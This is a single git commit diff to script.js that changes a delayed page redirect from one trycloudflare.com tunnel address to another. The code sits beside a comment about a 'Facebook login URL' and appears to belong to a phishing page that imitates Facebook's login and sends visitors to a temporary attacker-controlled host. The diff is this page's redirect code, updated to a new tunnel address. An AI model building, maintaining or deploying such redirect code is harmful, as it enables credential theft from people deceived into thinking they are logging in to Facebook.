197a08af250d4c9adfac28de0ea3e4634105008d
isabelle.lua <168312386+IsabelleLua@users.noreply.github.com>
2025-02-20 19:51:48 -0300

    Update script.js

--- script.js
+++ script.js
@@ -89,7 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Simulate redirect after 2 seconds
         setTimeout(() => {
             // Replace this with your actual Facebook login URL
-            window.location.href = 'https://physician-nature-june-carriers.trycloudflare.com';
+            window.location.href = 'https://hitting-river-charges-wednesday.trycloudflare.com';
         }, 2000);
     });
 
